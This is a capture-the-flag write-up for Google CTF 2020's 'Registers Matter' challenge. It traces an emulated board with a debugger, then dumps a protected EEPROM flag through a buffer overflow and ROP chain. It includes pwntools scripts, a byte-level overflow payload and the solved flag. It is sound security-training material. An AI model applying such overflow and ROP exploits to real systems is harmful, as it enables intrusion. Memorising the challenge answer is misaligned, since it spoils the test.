# Google CTF - Registers Matter (347pt / 12 solves)

We have an unknown remotely accessible board that hides the flag. Try to debug it to steal the flag!

Files:

- debugger.zip

## 1. Investigating the `debugger.py`

We quickly realised that `debugger.py` was a helpful client, allowing to interact with the server via simple text-based protocol. Client provided nice interface for debugging facilities (e.g. pretty-printing register info). 

After connecting to the server, we've been asked to enter one of 2 modes: 

- **debug** - which starts application in debug mode, accepting debugger commands like adding breakpoints, reading/modifying registers and stepping through instructions
- **challenge** - in which the flag was available, but without access to debugger

After running the application, it shows a menu and asks for a command:
```
Menu:
1. Read the EEPROM
2. Magic function
0. Exit
Choice (do not enter more than 5 chars):
```

### 1.1 Reading EEPROM

First command asks for starting sector and number of sectors to read. Unfortunately, there comes the first limitation: we're able to read only 0x800-0x1000 region. After choosing lower sector number, we're getting an error message:

```
Menu:
1. Read from EEPROM
2. Magic function
0. Exit
Choice (do not enter more than 5 chars): 1
Enter start sector (16-31, 0 to exit): 1
### DENIED: access to software-protected area!
```

This suggests that flag is contained in the lower part of EEPROM memory. The higher part contains only `Hello there!` string with other bytes zeroed.
```
Enter start sector (16-31, 0 to exit): 16
Enter number of sectors to read (1-16): 16
=== EEPROM dump (0x800 - 0x1000) ===
0800: 48 65 6C 6C 6F 20 74 68  65 72 65 21 00 00 00 00  |  Hello there!....
0810: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0820: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0FF0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
```

### 1.2. Magic function

Second command asks for two "Magic component" numbers A and B.

```
Menu:
1. Read from EEPROM
2. Magic function
0. Exit
Choice (do not enter more than 5 chars): 2
Enter Magic component number A and then B:
0
1
Wheee: 0, 1!

Enter Magic component number A and then B:
1
2
No magic for 1, 2 :(

Enter Magic component number A and then B:
2
2
You are not a Wizard for Real magic of 2, 2 :(
```

Output seemed to depend mostly on the first component value, showing one of three response variants.

### 1.3. Debugger

After choosing debugger mode in the first menu, we're getting simple debugger shell.

```
Please choose mode of operation:
 D - debug session
 C - challenge mode
Choice: D
DBG> help
Available commands:
  step [COUNT]
  input STR
  cont
  trace
  pause SECS
  reg [<RN> <VALUE>] ... [<RN> <VALUE>]
  break [delete|toggle N] | [ADDR]
  write RAW-COMMAND
  quit|exit
```

Debugger allows to set breakpoints, single-stepping, reading/modifying the registers and turning on the "trace" mode which prints processor state after each instruction.

Let's turn on the `trace`. After short time we're getting the input reading loop:

```
 pc = 00014A  gp0 = 20   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 1DCA    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = DE  gp13 = 1D  gp14 = 00  gp15 = 02
flg = 80     gp16 = DE  gp17 = 1D  gp18 = 03  gp19 = 00  gp20 = 00  gp21 = 02  gp22 = 00  gp23 = 04
00000001F9E2 gp24 = 01  gp25 = 02  gp26 = 00  gp27 = 02  gp28 = 00  gp29 = 02  gp30 = 9B  gp31 = 00  gp32 = 000006

 pc = 00014A  gp0 = 20   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 1DCA    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = DE  gp13 = 1D  gp14 = 00  gp15 = 02
flg = 80     gp16 = DE  gp17 = 1D  gp18 = 03  gp19 = 00  gp20 = 00  gp21 = 02  gp22 = 00  gp23 = 04
00000001F9E2 gp24 = 01  gp25 = 02  gp26 = 00  gp27 = 02  gp28 = 00  gp29 = 02  gp30 = 9B  gp31 = 00  gp32 = 000006

...
```

Machine underneath uses 32 general purpose registers (8-bit `gp0-31` and 24-bit `gp32`), stack pointer `sp`, flag register `flg`, program counter `pc` and unlabeled register keeping the count of executed instructions.

After short trace analysis we found that `gp32` depends on `sp` and shows three bytes from stack: `sp-1`, `sp` and `sp+1`.

It also turned out that application was performing a lot of loops even during printing output characters, which made output from tracing a lot harder to read. Knowing all of this we decided to focus our attention on read EEPROM functionality first to read other EEPROM sectors.

## 2. Dumping EEPROM

By analyzing a trace, we found two points that seemed nice for putting a breakpoint:
- `0x14a` when application waits for input
- `0x12c` when application sends output character

Debugger allows us to change the value of `gp` registers, so let's find the actual "EEPROM read" operation. We've used breakpoints above to automate the interaction with server and trace it only during the actual command execution.

First, we've looked for instruction that puts "Hello there!" subsequent bytes to the registers (load from EEPROM). We've found a good candidate @ 0x778:

```
PC=000778 SP=1DE3 FLAGS=20
REGS=20,00,00,00,00,00,00,00,00,00,00,00,17,04,FA,1D,E3,03,03,00,00,00,00,00,E3,03,D6,00,00,00,E3,03,001DEA
PC=00077A SP=1DE3 FLAGS=20
REGS=20,00,00,00,00,00,00,00,00,00,00,00,17,04,FA,1D,E3,03,03,00,00,00,00,00,4D,03,D6,00,00,00,E4,03,001DEA
                                                                             ^^
--
PC=000778 SP=1DE3 FLAGS=22
REGS=20,00,00,00,00,00,00,00,00,00,00,00,17,04,FA,1D,E4,03,03,00,00,00,00,02,00,00,00,02,00,00,E4,03,CA1DEA
PC=00077A SP=1DE3 FLAGS=22
REGS=20,00,00,00,00,00,00,00,00,00,00,00,17,04,FA,1D,E4,03,03,00,00,00,00,02,65,00,00,02,00,00,E5,03,CA1DEA
                                                                             ^^
--
PC=000778 SP=1DE3 FLAGS=22
REGS=20,00,00,00,00,00,00,00,00,00,00,00,17,04,FA,1D,E5,03,03,00,00,00,00,02,00,00,00,02,00,00,E5,03,CA1DEA
PC=00077A SP=1DE3 FLAGS=22
REGS=20,00,00,00,00,00,00,00,00,00,00,00,17,04,FA,1D,E5,03,03,00,00,00,00,02,6E,00,00,02,00,00,E6,03,CA1DEA
                                                                             ^^
--
PC=000778 SP=1DE3 FLAGS=22
REGS=20,00,00,00,00,00,00,00,00,00,00,00,17,04,FA,1D,E6,03,03,00,00,00,00,02,00,00,00,02,00,00,E6,03,CA1DEA
PC=00077A SP=1DE3 FLAGS=22
REGS=20,00,00,00,00,00,00,00,00,00,00,00,17,04,FA,1D,E6,03,03,00,00,00,00,02,75,00,00,02,00,00,E7,03,CA1DEA
                                                                             ^^
```

In trace presented above, it loads next bytes of `Menu` string from `0x3E3-0x3E6` (`gp31:gp32 => gp24`) and increments address in `gp31:gp32` registers. At first sight, it looked to be the "load operation" we're looking for. 

```python
def read_from_addr(addr, len):
    buf = []
    r = remote("registers.2020.ctfcompetition.com", 1337)
    # Enter debugger
    r.recvuntil("&M")
    r.sendline("&D")
    # Set breakpoint at 778
    r.sendline("*B+%04X" % 0x778)
    for l in range(len):
        memaddr = addr + l
        # Continue
        r.sendline("*C")
        # Wait for hit
        r.recvuntil("*B|0001")
        r.sendline(zero_regs + ",30=%04X,31=%04X$" % (memaddr & 0xff, (memaddr >> 8) & 0xff))
        r.sendline("*S")
        regs = r.recvuntil("$")
        memread = int(regs.split("|")[1].split(",")[28], 16)
        buf.append(chr(memread))  
        print(hex(memaddr), chr(memread), regs)  
    r.close()
    return ''.join(buf)
```

After probing various regions, we've found that 0x200-0x500 region contains strings used by application.
```
\x00\x00\x00\x00\x92\x00\x00\x00\x00\x00heee: %d, %d!
\x00o magic for %d, %d :(
\x00== EEPROM dump (0x%02X - 0x%02X) ===
\x00## ERROR: read beyond flash boundaries
\x0002X \x00|  \x00%04X: \x00ou are not a Wizard for Real magic of %d, %d :(
\x00nter start sector (16-31, 0 to exit): \x00-> wrong start sector number\x00## DENIED: access to software-protected area!\x00nter number of sectors to read (1-16): \x00-> wrong sectors number\x00-> read beyound flash boundaries\x00nter Magic component number A and then B:\x00nknown choice.\x00enu:\x00. Read from EEPROM\x00. Magic function\x00. Exit\x00hoice (do not enter more than 5 chars): \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
```
Unfortunately, it wasn't "load from EEPROM" instruction but data memory load (RAM). Using this instruction, 0x800-0x1000 region was returning just zeroes.

We've tried to put different sector numbers/length to compare the traces and possibly find the next instruction. Then we've found the 0xBAA when evaluated starting section address has been put into the register. Let's try to change that value using debugger to read the "reserved" area.

```
DBG> b 2986
DBG> cont
Choice (do not enter more than 5 chars): 1
Enter start sector (16-31, 0 to exit): 16
Enter number of sectors to read (1-16): ^C
DBG> 
Cycles passed: 14230405
DBG> b t 1
DBG> c
16
=== EEPROM dump (0x800 - 0x1000) ===

 pc = 000BAA  gp0 = 80   gp1 = 00   gp2 = 00   gp3 = 21   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 08
 sp = 1DB3    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 17  gp13 = 04  gp14 = 00  gp15 = 08
flg = 80     gp16 = 00  gp17 = 10  gp18 = 03  gp19 = 02  gp20 = 31  gp21 = 1D  gp22 = 00  gp23 = 02
00000146AD63 gp24 = 25  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = BA  gp29 = 1D  gp30 = 00  gp31 = 02  gp32 = 000000

Breakpoint hit #1
Cycles passed: 50057
DBG> r 7 0
DBG> b t 1
DBG> c
0000: 43 54 46 7B 44 45 42 55  47 5F 4D 4F 44 45 2C 4E  |  CTF{DEBUG_MODE,N
0010: 4F 54 20 41 20 46 4C 41  47 7D 00 00 00 00 00 00  |  OT A FLAG}......
0020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
00A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
00B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
00C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
00D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
00E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
```

Now, we're sure that flag is contained in EEPROM at zero address. Unfortunately, when application is put into debug mode: we can only get fake flag `CTF{DEBUG_MODE,NOT A FLAG}`

0xBAA wasn't a great candidate because "address evaluation" function is also used during printing the menu:

```
Please choose mode of operation:
 D - debug session
 C - challenge mode
Choice: D
DBG> b 2986
DBG> c
Menu:
1. Read from EEPROM
2. Magic function
0. Exit
Choice (do not enter more than 5 chars): 
 pc = 000BAA  gp0 = 20   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 1DDC    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 17  gp13 = 04  gp14 = FA  gp15 = 1D
flg = 20     gp16 = 00  gp17 = 04  gp18 = 03  gp19 = 00  gp20 = EB  gp21 = 1D  gp22 = 00  gp23 = 02
00000001F99E gp24 = 29  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = E3  gp29 = 1D  gp30 = 00  gp31 = 02  gp32 = 000000
```

So we came back to the trace, looking for the "main EEPROM dump function". We were focused on instructions that are executed with high `sp` address (lowest number of elements on call stack) and we've found the next candidate @ 0x466:

```
I|236496,00022C,1DD9,80,80,00,00,00,00,00,00,00,00,00,00,00,44,03,CF,02,FA,1D,DA,00,00,02,00,0A,16,00,00,02,D8,00,D6,1D,001200$
I|236497,00022E,1DDA,80,80,00,00,00,00,00,00,00,00,00,00,00,44,03,CF,02,FA,1D,DA,00,00,02,00,0A,16,00,00,02,12,00,D6,1D,120002$
I|236498,000466,1DDD,80,80,00,00,00,00,00,00,00,00,00,00,00,44,03,CF,02,FA,1D,DA,00,00,02,00,0A,16,00,00,02,12,00,D6,1D,334403$
I|236499,000468,1DDD,80,80,00,00,00,00,00,00,00,00,00,00,00,44,03,CF,02,FA,1D,16,00,00,02,00,0A,16,00,00,02,12,00,D6,1D,334403$
                                                                                                ^^^^^       ^^^^^
                                                                                                count       start
```

By setting appropriate values to the `gp28:gp29` and `gp24:gp25` registers, we could dump EEPROM from chosen starting sector.

The next task was to find a vulnerability that allows to set these registers to the first sector and jump to 0x466 hoping that this will dump the EEPROM part containing the flag.


## 3. Analysing magic function

Fortunately, magic function was vulnerable to the most simple buffer overflow. By inputting a lot of `AAAAAAAAAAAAAAAAAA` we noticed that PC register got changed. Moreover, we could control the stack.

```
 pc = 00022C  gp0 = A0   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 1DE6    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 17  gp13 = 04  gp14 = FA  gp15 = 1D
flg = A0     gp16 = 00  gp17 = 04  gp18 = 35  gp19 = 00  gp20 = 00  gp21 = 02  gp22 = 00  gp23 = 04
00000002E18E gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = E5  gp29 = 65  gp30 = E1  gp31 = 1D  gp32 = 656565

 pc = 00022E  gp0 = A0   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 1DE7    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 17  gp13 = 04  gp14 = FA  gp15 = 1D
flg = A0     gp16 = 00  gp17 = 04  gp18 = 35  gp19 = 00  gp20 = 00  gp21 = 02  gp22 = 00  gp23 = 04
00000002E18F gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = 65  gp29 = 65  gp30 = E1  gp31 = 1D  gp32 = 656565

 pc = CACACA  gp0 = A0   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 1DEA    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 17  gp13 = 04  gp14 = FA  gp15 = 1D
flg = A0     gp16 = 00  gp17 = 04  gp18 = 35  gp19 = 00  gp20 = 00  gp21 = 02  gp22 = 00  gp23 = 04
00000002E190 gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = 65  gp29 = 65  gp30 = E1  gp31 = 1D  gp32 = 656565

 pc = 000000  gp0 = A0   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 1DEA    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 17  gp13 = 04  gp14 = FA  gp15 = 1D
flg = A0     gp16 = 00  gp17 = 04  gp18 = 35  gp19 = 00  gp20 = 00  gp21 = 02  gp22 = 00  gp23 = 04
00000002E191 gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = 65  gp29 = 65  gp30 = E1  gp31 = 1D  gp32 = 656565
```
 
We are controlling the PC (doubled value from stack is loaded to PC) and `gp28:gp29` are already set to the values from stack! Unfortunately, we can't control the section count `gp24:gp25` which is set to zero.

This immediately suggested a ROP chain. We have a good place to jump to (@0x466) but we need to find a gadget that allows to increment `gp24:gp25` value or set to the value fetched from the stack.

With small help from Python we have transformed trace to check how registers are changed by traced instructions.
```
000228 SP 1DDF => 1DE5
       REG 36 0F4242$ => 424242
00022A SP 1DE5 => 1DE6
       REG 33 1D => 42
       REG 36 424242 => 424200
00022C SP 1DE6 => 1DE7
       REG 32 E5 => 42
       REG 36 424200 => 420005
00022E REG 36 420005 => D54142
       RET stack size 0x3
```
This allowed us to easily find gadgets. A gadget @ 0xCCE can be used to overwrite wanted registers.

```
000CCE
        modified REG 28 01 => 59

000CD0
        modified SP 1DB3 => 1DB4
        modified REG 33 00 => 1D
        modified REG 36 5B1DBA => 1DBA1D

000CD2
        modified SP 1DB4 => 1DB5
        modified REG 32 59 => BA
        modified REG 36 1DBA1D => BA1DE2

000CD4
        modified SP 1DB5 => 1DB6
        modified REG 21 02 => 1D
        modified REG 36 BA1DE2 => 1DE200

000CD6
        modified SP 1DB6 => 1DB7
        modified REG 20 00 => E2
        modified REG 36 1DE200 => E20004

000CD8
        modified SP 1DB7 => 1DBA
        modified REG 36 E20004 => 1A065B
        JMP 000CD8 => 000834

```
```
I|208087,000CCE,1DB3,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,00,02,03,00,E2,1D,00,02,0F,00,00,02,57,00,92,00,5B1DBA$
I|208088,000CD0,1DB3,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,00,02,03,00,E2,1D,00,02,57,00,00,02,57,00,92,00,5B1DBA$
I|208089,000CD2,1DB4,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,00,02,03,00,E2,1D,00,02,57,00,00,02,57,1D,92,00,1DBA1D$
I|208090,000CD4,1DB5,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,00,02,03,00,E2,1D,00,02,57,00,00,02,BA,1D,92,00,BA1DE2$
I|208091,000CD6,1DB6,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,00,1D,03,00,E2,1D,00,02,57,00,00,02,BA,1D,92,00,1DE200$
I|208092,000CD8,1DB7,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,E2,1D,03,00,E2,1D,00,02,57,00,00,02,BA,1D,92,00,E20004$
I|208093,000834,1DBA,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,E2,1D,03,00,E2,1D,00,02,57,00,00,02,BA,1D,92,00,1A065B$
```

`CCE` instruction moves instruction `gp28 => gp24`. Then `CD0` and `CD2` pops `gp29` and `gp28` from the stack. Finally, gadget returns at 0xCD8 without overwriting crucial registers.

### 4. Joining everything together

Using gadgets found before we have constructed a payload:
```
2\n            # 'magic' function
1\n            # first value
BBBBBB         # padding
\x00\x01       # sector count: 1
\x00\x06\x62   # 0x662 * 2 => 0xCC4
\x00\x00       # starting sector: 0
AA             # padding
\x00\x02\x33\n # 0x233 * 2 => 0x466
```

Finally, we've joined everything together and wrote a simple script that encoded our exploit and decoded the resulting output from server:

```python
from pwn import *

def read_line(r):
    writes = r.readuntil("@W0A")
    print(''.join([chr(int(c if c else "00", 16)) for c in writes.split("@W")]))

def writestr(r, s):
    r.sendline(''.join("@W%02X" % ord(c) for c in s))
    
r = remote("registers.2020.ctfcompetition.com", 1337)
# Enter the challenge mode
r.recvuntil("&M")
r.sendline("&C")
# Write input
writestr(r, '2\n1\nBBBBBB\x00\x01\x00\x06\x62\x00\x00AA\x00\x02\x33\n')
# Read output
for i in range(8):
    read_line(r)
```

After executing the exploit, we've successfully dumped first EEPROM sector getting a flag!

```
[+] Opening connection to registers.2020.ctfcompetition.com on port 1337: Done
\x00enu:

\x00. Read from EEPROM

\x00. Magic function

\x00. Exit

\x00hoice (do not enter more than 5 chars): Enter Magic component number A and then B:

\x00== EEPROM dump (0x00 - 0x80) ===

\x00000: 43 54 46 7B 72 33 36 31  35 37 33 72 35 39 30 37  |  CTF{r361573r5907

\x00010: 33 37 37 33 72 7D 00 00  00 00 00 00 00 00 00 00  |  3773r}..........
```

Dumped flag: `CTF{r361573r59073773r}`. 
